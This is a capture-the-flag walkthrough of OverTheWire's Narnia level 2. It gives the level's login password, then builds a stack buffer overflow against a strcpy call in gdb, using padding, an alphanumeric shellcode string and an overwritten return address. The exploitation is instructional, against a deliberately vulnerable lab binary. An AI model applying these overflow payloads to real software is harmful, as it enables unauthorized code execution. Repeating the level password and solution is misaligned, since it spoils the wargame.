```bash
user@host:~$ ssh narnia2@narnia.labs.overthewire.org -p 2226
nairiepecu
```

Just like in level 0 and 1 we will navigate to the `/narnia` directory, as there were some programs for each level. The source code for the program `narnia2` is (excluding the licensing information):

```c
narnia2@narnia:/narnia$ cat narnia2.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}

```

So the program reads back to you what you enter in the terminal?

```sh
narnia2@narnia:/narnia$ ./narnia2 hello
hellonarnia2@narnia:/narnia$
```

Weird. What if we enter more bytes than there are in the buffer? A segmentation fault.

Great.

Let's debug this shit.

```sh
narnia2@narnia:/narnia$ gdb ./narnia2
(gdb) disass main
Dump of assembler code for function main:
   0x0804844b <+0>:     push   %ebp
   0x0804844c <+1>:     mov    %esp,%ebp
   0x0804844e <+3>:     add    $0xffffff80,%esp
   0x08048451 <+6>:     cmpl   $0x1,0x8(%ebp)
   0x08048455 <+10>:    jne    0x8048471 <main+38>
   0x08048457 <+12>:    mov    0xc(%ebp),%eax
   0x0804845a <+15>:    mov    (%eax),%eax
   0x0804845c <+17>:    push   %eax
   0x0804845d <+18>:    push   $0x8048520
   0x08048462 <+23>:    call   0x8048300 <printf@plt>
   0x08048467 <+28>:    add    $0x8,%esp
   0x0804846a <+31>:    push   $0x1
   0x0804846c <+33>:    call   0x8048320 <exit@plt>
   0x08048471 <+38>:    mov    0xc(%ebp),%eax
   0x08048474 <+41>:    add    $0x4,%eax
   0x08048477 <+44>:    mov    (%eax),%eax
   0x08048479 <+46>:    push   %eax
   0x0804847a <+47>:    lea    -0x80(%ebp),%eax
   0x0804847d <+50>:    push   %eax
   0x0804847e <+51>:    call   0x8048310 <strcpy@plt>
   0x08048483 <+56>:    add    $0x8,%esp
   0x08048486 <+59>:    lea    -0x80(%ebp),%eax
   0x08048489 <+62>:    push   %eax
   0x0804848a <+63>:    push   $0x8048534
   0x0804848f <+68>:    call   0x8048300 <printf@plt>
   0x08048494 <+73>:    add    $0x8,%esp
   0x08048497 <+76>:    mov    $0x0,%eax
   0x0804849c <+81>:    leave
   0x0804849d <+82>:    ret
End of assembler dump.
(gdb)
```

Let's see what happens at the end of the program first.

```sh
(gdb) break *0x0804849c
Breakpoint 1 at 0x804849c
(gdb) run $(python -c 'print "0"*128')
Starting program: /narnia/narnia2 $(python -c 'print "0"*128')
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000[Inferior 1 (process 20590) exited normally]
```

If we keep increasing the size of the argument, eventually we will hit a segmentation fault:

```
(gdb) run $(python -c 'print "0"*132')
Starting program: /narnia/narnia2 $(python -c 'print "0"*132')

Program received signal SIGSEGV, Segmentation fault.
0xf7e2a202 in __libc_start_main () from /lib32/libc.so.6
```

Now, the buffer overflow of the  `strcpy` of the `buf` variable hits an address, which is the return code for the program. Let us see whether we can put something there after the overflow, but remember that this works backwards!

```
(gdb) run $(python -c 'print "0"*132 + "\xef\xbe\xad\xde"')
Starting program: /narnia/narnia2 $(python -c 'print "0"*132 + "\xef\xbe\xad\xde"')

Program received signal SIGSEGV, Segmentation fault.
0xdeadbeef in ?? ()
```

What we can do now, is load a program of 132 bytes long and exploit the buffer overflow by giving an address instead of just `0xdeadbeef` at the end. The length of our last shell code is 79 bytes.

```
narnia2@narnia:/narnia$ python -c 'print len("hzzzzYAAAAAA0HM0hN0HNhu12ZX5ZBZZPhu834X5ZZZZPTYhjaaaX5aaaaP5aaaa5jaaaPPQTUVWaMz")'
79
```

Reserving 4 bytes for a control `0xdeadbeef` at the end, we can prepend 53 characters to our shell code:

```
(gdb) run $(python -c 'print "0"*53 + "hzzzzYAAAAAA0HM0hN0HNhu12ZX5ZBZZPhu834X5ZZZZPTYhjaaaX5aaaaP5aaaa5jaaaPPQTUVWaMz" + "\xef\xbe\xad\xde"')
Starting program: /narnia/narnia2 $(python -c 'print "0"*53 + "hzzzzYAAAAAA0HM0hN0HNhu12ZX5ZBZZPhu834X5ZZZZPTYhjaaaX5aaaaP5aaaa5jaaaPPQTUVWaMz" + "\xef\xbe\xad\xde"')

Breakpoint 1, 0x0804849c in main ()
(gdb) n
Single stepping until exit from function main,
which has no line number information.
0xdeadbeef in ?? ()
```

Now we need to see where our shellcode can start:

```
(gdb) x/40xw $esp-132
0xffffd5bc:     0x30303030      0x30303030      0x30303030      0x30303030
0xffffd5cc:     0x30303030      0x30303030      0x30303030      0x30303030
0xffffd5dc:     0x30303030      0x30303030      0x30303030      0x30303030
0xffffd5ec:     0x7a7a6830      0x41597a7a      0x41414141      0x4d483041
0xffffd5fc:     0x304e6830      0x75684e48      0x585a3231      0x5a425a35
0xffffd60c:     0x7568505a      0x58343338      0x5a5a5a35      0x5954505a
0xffffd61c:     0x61616a68      0x61355861      0x50616161      0x61616135
0xffffd62c:     0x616a3561      0x50506161      0x56555451      0x7a4d6157
0xffffd63c:     0xdeadbeef      0x00000000      0xffffd6d4      0xffffd6e0
0xffffd64c:     0x00000000      0x00000000      0x00000000      0xf7fc5000
```

0xffffd5dc

So we should start the shellcode execution at `0xffffd5ec` and give that address as a pointer. Let's give it a try!

```
(gdb) run $(python -c 'print "0"*53 + "hzzzzYAAAAAA0HM0hN0HNhu12ZX5ZBZZPhu834X5ZZZZPTYhjaaaX5aaaaP5aaaa5jaaaPPQTUVWaMz" + "\xec\xd5\xff\xff"')
Starting program: /narnia/narnia2 $(python -c 'print "0"*53 + "hzzzzYAAAAAA0HM0hN0HNhu12ZX5ZBZZPhu834X5ZZZZPTYhjaaaX5aaaaP5aaaa5jaaaPPQTUVWaMz" + "\xec\xd5\xff\xff"')

Breakpoint 1, 0x0804849c in main ()
(gdb) n
Single stepping until exit from function main,
which has no line number information.
0xffffd5ec in ?? ()
(gdb) x/40xw $esp-132
0xffffd5bc:     0x30303030      0x30303030      0x30303030      0x30303030
0xffffd5cc:     0x30303030      0x30303030      0x30303030      0x30303030
0xffffd5dc:     0x30303030      0x30303030      0x30303030      0x30303030
0xffffd5ec:     0x7a7a6830      0x41597a7a      0x41414141      0x4d483041
0xffffd5fc:     0x304e6830      0x75684e48      0x585a3231      0x5a425a35
0xffffd60c:     0x7568505a      0x58343338      0x5a5a5a35      0x5954505a
0xffffd61c:     0x61616a68      0x61355861      0x50616161      0x61616135
0xffffd62c:     0x616a3561      0x50506161      0x56555451      0x7a4d6157
0xffffd63c:     0xffffd5ec      0x00000000      0xffffd6d4      0xffffd6e0
0xffffd64c:     0x00000000      0x00000000      0x00000000      0xf7fc5000
```
